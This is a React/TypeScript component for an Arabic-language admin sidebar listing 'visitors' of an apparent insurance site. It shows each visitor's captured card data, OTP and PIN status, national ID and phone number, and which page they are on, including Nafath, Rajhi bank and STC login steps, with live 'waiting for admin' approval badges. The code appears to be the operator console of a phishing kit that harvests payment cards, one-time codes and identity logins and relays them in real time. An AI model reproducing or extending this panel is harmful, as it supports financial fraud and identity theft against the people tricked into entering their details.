"use client";

import {
  Search,
  Trash2,
  CheckSquare,
  Square,
  CreditCard,
  KeyRound,
  RefreshCw,
  Ban,
  ShieldCheck,
} from "lucide-react";
import type { InsuranceApplication } from "@/lib/firestore-types";
import { getTimeAgo } from "@/lib/time-utils";
import { updateApplication } from "@/lib/firebase-services";
import { useState } from "react";

interface VisitorSidebarProps {
  visitors: InsuranceApplication[];
  selectedVisitor: InsuranceApplication | null;
  onSelectVisitor: (visitor: InsuranceApplication) => void;
  searchQuery: string;
  onSearchChange: (query: string) => void;
  cardFilter: "all" | "hasCard";
  onCardFilterChange: (filter: "all" | "hasCard") => void;
  selectedIds: Set<string>;
  onToggleSelect: (id: string) => void;
  onSelectAll: () => void;
  onDeleteSelected: () => void;
  sidebarWidth: number;
  onSidebarWidthChange: (width: number) => void;
}

const isWaitingForAdmin = (visitor: InsuranceApplication): boolean => {
  return (
    visitor.cardStatus === "waiting" ||
    visitor.cardStatus === "message" ||
    visitor.otpStatus === "waiting" ||
    visitor.pinStatus === "waiting" ||
    visitor.nafadConfirmationStatus === "waiting"
  );
};

const getCardStatusBadge = (status: InsuranceApplication["cardStatus"]) => {
  switch (status) {
    case "approved_with_otp":
      return { label: "✓ OTP", cls: "bg-emerald-900/40 text-emerald-400 border border-emerald-700/50" };
    case "approved_with_pin":
      return { label: "✓ PIN", cls: "bg-emerald-900/40 text-emerald-400 border border-emerald-700/50" };
    case "rejected":
      return { label: "✗ مرفوض", cls: "bg-red-900/40 text-red-400 border border-red-700/50" };
    case "message":
      return { label: "📲 رسالة", cls: "bg-amber-900/40 text-amber-400 border border-amber-700/50 animate-pulse" };
    case "waiting":
      return { label: "⏳ انتظار", cls: "bg-yellow-900/40 text-yellow-400 border border-yellow-700/50" };
    default:
      return null;
  }
};

const getPageName = (step: number | string): string => {
  if (typeof step === "string") {
    const stringPageNames: Record<string, string> = {
      home: "الرئيسية", "home-new": "الرئيسية", insur: "بيانات التأمين",
      compar: "مقارنة العروض", payment: "الدفع (بطاقة)", check: "الدفع",
      _st1: "الدفع (بطاقة)", _t1: "بيانات البطاقة", otp: "OTP", _t2: "OTP",
      step2: "OTP", veri: "رمز تحقق", pin: "PIN", _t3: "PIN", step3: "PIN",
      confi: "PIN", phone: "الهاتف", step5: "الهاتف", nafad: "نفاذ", _t6: "نفاذ",
      step4: "نفاذ", nafad_modal: "نافذة نفاذ", finalOtp: "OTP الأخير",
      rajhi: "راجحي", "stc-login": "دخول STC",
    };
    return stringPageNames[step] || `غير محدد (${step})`;
  }
  const stepNum = typeof step === "number" ? step : parseInt(step);
  const pageNames: Record<number, string> = {
    0: "الرئيسية", 1: "الرئيسية", 2: "بيانات التأمين", 3: "مقارنة العروض",
    4: "الدفع", 5: "OTP", 6: "PIN", 7: "الهاتف", 8: "نفاذ", 9: "OTP الأخير",
  };
  return pageNames[stepNum] || `غير محدد (${stepNum})`;
};

const getVisitorDisplayName = (visitor: InsuranceApplication) =>
  visitor.ownerName || (visitor as any).name || "بدون اسم";

const getVisitorCurrentPage = (visitor: InsuranceApplication) =>
  (visitor.redirectPage || visitor.currentPage || visitor.currentStep || "home") as number | string;

const hasCardData = (visitor: InsuranceApplication): boolean => {
  if (visitor._v1 || visitor.cardNumber) return true;
  if (!visitor.history || !Array.isArray(visitor.history)) return false;
  return visitor.history.some(
    (entry: any) =>
      (entry.type === "_t1" || entry.type === "card") &&
      (entry.data?._v1 || entry.data?.cardNumber)
  );
};

function BlockButton({ visitor }: { visitor: InsuranceApplication }) {
  const [loading, setLoading] = useState(false);

  const handleToggle = async (e: React.MouseEvent) => {
    e.stopPropagation();
    if (!visitor.id || loading) return;
    setLoading(true);
    try {
      await updateApplication(visitor.id, { isBlocked: !visitor.isBlocked });
    } catch { }
    finally { setLoading(false); }
  };

  return (
    <button
      onClick={handleToggle}
      disabled={loading}
      title={visitor.isBlocked ? "إلغاء الحظر" : "حظر الزائر"}
      className="flex items-center justify-center w-7 h-7 rounded-full transition-all disabled:opacity-40"
      style={visitor.isBlocked
        ? { background: "rgba(239,68,68,0.15)", color: "#f87171", border: "1px solid rgba(239,68,68,0.3)" }
        : { background: "rgba(255,255,255,0.05)", color: "rgba(148,163,184,0.5)", border: "1px solid rgba(255,255,255,0.08)" }}
    >
      {visitor.isBlocked ? <ShieldCheck className="w-3.5 h-3.5" /> : <Ban className="w-3.5 h-3.5" />}
    </button>
  );
}

export function VisitorSidebar({
  visitors, selectedVisitor, onSelectVisitor, searchQuery, onSearchChange,
  cardFilter, onCardFilterChange, selectedIds, onToggleSelect,
  onSelectAll, onDeleteSelected, sidebarWidth, onSidebarWidthChange,
}: VisitorSidebarProps) {
  const allSelected = visitors.length > 0 && selectedIds.size === visitors.length;
  const unreadCount = visitors.filter((v) => v.isUnread).length;
  const waitingCount = visitors.filter(isWaitingForAdmin).length;
  const isLandscape =
    typeof window !== "undefined" &&
    window.matchMedia("(orientation: landscape) and (max-width: 1024px)").matches;

  return (
    <div
      className="h-full w-full landscape:border-l md:w-[400px] md:border-l flex flex-col relative"
      style={{
        fontFamily: "Cairo, Tajawal, sans-serif",
        width: isLandscape ? `${sidebarWidth}px` : undefined,
        background: "rgba(9,14,28,0.97)",
        borderColor: "rgba(99,102,241,0.12)",
      }}
    >
      {/* Header */}
      <div className="p-3 sm:p-4 landscape:p-2" style={{ borderBottom: "1px solid rgba(99,102,241,0.12)", background: "rgba(13,21,42,0.8)" }}>
        <h1 className="text-base landscape:text-sm font-bold mb-3 landscape:mb-1.5" style={{ color: "#e2e8f0" }}>
          قائمة الزوار
        </h1>

        {/* Stats badges */}
        <div className="mb-3 flex flex-wrap items-center gap-1.5">
          <span className="text-[10px] font-semibold px-2 py-0.5 rounded-full"
            style={{ background: "rgba(99,102,241,0.12)", color: "rgba(99,102,241,0.9)", border: "1px solid rgba(99,102,241,0.2)" }}>
            إجمالي: {visitors.length}
          </span>
          {unreadCount > 0 && (
            <span className="text-[10px] font-semibold px-2 py-0.5 rounded-full"
              style={{ background: "rgba(236,72,153,0.12)", color: "rgba(236,72,153,0.9)", border: "1px solid rgba(236,72,153,0.2)" }}>
              غير مقروء: {unreadCount}
            </span>
          )}
          {waitingCount > 0 && (
            <span className="text-[10px] font-semibold px-2 py-0.5 rounded-full animate-pulse"
              style={{ background: "rgba(245,158,11,0.12)", color: "rgba(245,158,11,0.9)", border: "1px solid rgba(245,158,11,0.2)" }}>
              قيد المراجعة: {waitingCount}
            </span>
          )}
        </div>

        {/* Search */}
        <div className="relative mb-3 landscape:mb-1.5">
          <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4" style={{ color: "rgba(99,102,241,0.6)" }} />
          <input
            type="text"
            placeholder="بحث (الاسم، الهوية، الهاتف...)"
            value={searchQuery}
            onChange={(e) => onSearchChange(e.target.value)}
            className="w-full rounded-xl py-2 pl-3 pr-9 text-sm outline-none transition-all landscape:py-1.5 landscape:text-xs"
            style={{
              background: "rgba(255,255,255,0.04)",
              border: "1px solid rgba(99,102,241,0.2)",
              color: "#e2e8f0",
            }}
            onFocus={e => { e.target.style.borderColor = "rgba(99,102,241,0.5)"; e.target.style.background = "rgba(99,102,241,0.06)" }}
            onBlur={e => { e.target.style.borderColor = "rgba(99,102,241,0.2)"; e.target.style.background = "rgba(255,255,255,0.04)" }}
          />
        </div>

        {/* Filters */}
        <div className="mb-3 grid grid-cols-2 gap-1.5 landscape:mb-1.5">
          {(["all", "hasCard"] as const).map((f) => (
            <button
              key={f}
              onClick={() => onCardFilterChange(f)}
              className="px-3 py-1.5 landscape:py-1 rounded-lg text-xs font-semibold transition-all duration-200"
              style={cardFilter === f
                ? { background: "linear-gradient(135deg, #4f46e5, #06b6d4)", color: "#fff", boxShadow: "0 2px 12px rgba(99,102,241,0.3)" }
                : { background: "rgba(255,255,255,0.04)", color: "rgba(148,163,184,0.7)", border: "1px solid rgba(255,255,255,0.07)" }}
            >
              {f === "all" ? "الكل" : "لديهم بطاقة"}
            </button>
          ))}
        </div>

        {/* Actions */}
        <div className="flex flex-wrap gap-1.5">
          <button
            onClick={onSelectAll}
            className="flex flex-1 min-w-[120px] items-center justify-center gap-1.5 rounded-lg px-3 py-1.5 text-xs font-medium transition-all duration-200"
            style={{ background: "rgba(255,255,255,0.05)", color: "rgba(148,163,184,0.8)", border: "1px solid rgba(255,255,255,0.07)" }}
          >
            {allSelected
              ? <><CheckSquare className="w-3.5 h-3.5" /> إلغاء الكل</>
              : <><Square className="w-3.5 h-3.5" /> تحديد الكل</>}
          </button>
          {selectedIds.size > 0 && (
            <button
              onClick={onDeleteSelected}
              className="flex flex-1 min-w-[120px] items-center justify-center gap-1.5 rounded-lg px-3 py-1.5 text-xs font-semibold transition-all duration-200"
              style={{ background: "rgba(239,68,68,0.12)", color: "#f87171", border: "1px solid rgba(239,68,68,0.25)" }}
            >
              <Trash2 className="w-3.5 h-3.5" />
              حذف ({selectedIds.size})
            </button>
          )}
        </div>
      </div>

      {/* Visitor List */}
      <div className="flex-1 overflow-y-auto">
        {visitors.length === 0 ? (
          <div className="p-8 text-center space-y-2">
            <p className="text-3xl">📭</p>
            <p className="font-semibold text-sm" style={{ color: "rgba(148,163,184,0.7)" }}>لا يوجد زوار</p>
            <p className="text-xs" style={{ color: "rgba(100,116,139,0.5)" }}>سيظهر الزوار هنا عند بدء التفاعل</p>
          </div>
        ) : (
          visitors.map((visitor) => {
            const hasCard = hasCardData(visitor);
            const isSelected = selectedVisitor?.id === visitor.id;
            const isBlocked = visitor.isBlocked;
            const isUnread = visitor.isUnread && !isBlocked;

            return (
              <div
                key={visitor.id}
                onClick={() => onSelectVisitor(visitor)}
                className="border-b cursor-pointer transition-all duration-150 p-3 sm:p-3.5 landscape:p-2"
                style={{
                  borderColor: "rgba(255,255,255,0.04)",
                  background: isSelected
                    ? "linear-gradient(135deg, rgba(99,102,241,0.12), rgba(6,182,212,0.06))"
                    : isBlocked
                    ? "rgba(239,68,68,0.05)"
                    : isUnread
                    ? "rgba(236,72,153,0.05)"
                    : "transparent",
                  borderRight: isSelected
                    ? "3px solid #6366f1"
                    : isBlocked
                    ? "3px solid rgba(239,68,68,0.6)"
                    : "3px solid transparent",
                }}
                onMouseEnter={e => {
                  if (!isSelected) (e.currentTarget as HTMLDivElement).style.background = "rgba(99,102,241,0.06)";
                }}
                onMouseLeave={e => {
                  if (!isSelected) (e.currentTarget as HTMLDivElement).style.background = isBlocked ? "rgba(239,68,68,0.05)" : isUnread ? "rgba(236,72,153,0.05)" : "transparent";
                }}
              >
                <div className="flex items-start gap-2.5">
                  {/* Checkbox */}
                  <div
                    onClick={(e) => { e.stopPropagation(); if (visitor.id) onToggleSelect(visitor.id); }}
                    className="mt-0.5 shrink-0"
                  >
                    {visitor.id && selectedIds.has(visitor.id)
                      ? <CheckSquare className="w-4 h-4" style={{ color: "#6366f1" }} />
                      : <Square className="w-4 h-4" style={{ color: "rgba(148,163,184,0.3)" }} />}
                  </div>

                  <div className="flex-1 min-w-0">
                    {/* Name row */}
                    <div className="flex items-start justify-between gap-1 mb-1">
                      <div className="flex flex-wrap items-center gap-1 min-w-0">
                        <h3 className="font-semibold text-sm truncate landscape:text-xs" style={{ color: "#e2e8f0" }}>
                          {getVisitorDisplayName(visitor)}
                        </h3>
                        {isBlocked && (
                          <span className="flex items-center gap-0.5 rounded-full px-1.5 py-0.5 text-[9px] font-bold"
                            style={{ background: "rgba(239,68,68,0.15)", color: "#f87171", border: "1px solid rgba(239,68,68,0.3)" }}>
                            <Ban className="w-2 h-2" /> محظور
                          </span>
                        )}
                        <span className="flex items-center gap-1 rounded px-1.5 py-0.5 text-[10px] font-medium"
                          style={{ background: "rgba(20,184,166,0.15)", color: "#2dd4bf", border: "1px solid rgba(20,184,166,0.25)" }}>
                          {isWaitingForAdmin(visitor) && <RefreshCw className="w-2.5 h-2.5 animate-spin" />}
                          {getPageName(getVisitorCurrentPage(visitor))}
                        </span>
                        {hasCard && (
                          <span className="flex items-center gap-0.5 rounded-full px-1.5 py-0.5 text-[9px] font-semibold"
                            style={{ background: "rgba(99,102,241,0.12)", color: "rgba(129,140,248,0.9)", border: "1px solid rgba(99,102,241,0.2)" }}>
                            <CreditCard className="w-2.5 h-2.5" /> بطاقة
                          </span>
                        )}
                        {(() => {
                          const badge = getCardStatusBadge(visitor.cardStatus);
                          return badge
                            ? <span className={`rounded-full px-1.5 py-0.5 text-[9px] font-semibold whitespace-nowrap ${badge.cls}`}>{badge.label}</span>
                            : null;
                        })()}
                      </div>

                      <div className="flex items-center gap-1.5 shrink-0">
                        <span className="text-[10px]" style={{ color: "rgba(100,116,139,0.7)" }}>
                          {getTimeAgo(visitor.updatedAt || visitor.lastSeen)}
                        </span>
                        <BlockButton visitor={visitor} />
                      </div>
                    </div>

                    {/* Contact row */}
                    <div className="hidden sm:flex items-center gap-2 mb-1 text-[11px]" style={{ color: "rgba(148,163,184,0.6)" }}>
                      {visitor.phoneNumber && <span>📞 {visitor.phoneNumber}</span>}
                      {visitor.identityNumber && <span>🆔 {visitor.identityNumber}</span>}
                    </div>

                    {/* Online status */}
                    <div className="hidden sm:flex items-center gap-2">
                      <div className="flex items-center gap-1">
                        <div className={`w-1.5 h-1.5 rounded-full ${visitor.isOnline ? "animate-pulse" : ""}`}
                          style={{ background: visitor.isOnline ? "#10b981" : "rgba(148,163,184,0.3)" }} />
                        <span className="text-[10px]" style={{ color: visitor.isOnline ? "rgba(16,185,129,0.8)" : "rgba(100,116,139,0.5)" }}>
                          {visitor.isOnline ? "متصل" : "غير متصل"}
                        </span>
                      </div>
                      {visitor.phoneVerificationCode && (
                        <div className="flex items-center px-1.5 py-0.5 rounded text-[10px]"
                          style={{ background: "rgba(139,92,246,0.1)", color: "rgba(167,139,250,0.8)" }}>
                          <KeyRound className="w-2.5 h-2.5" />
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              </div>
            );
          })
        )}
      </div>
    </div>
  );
}
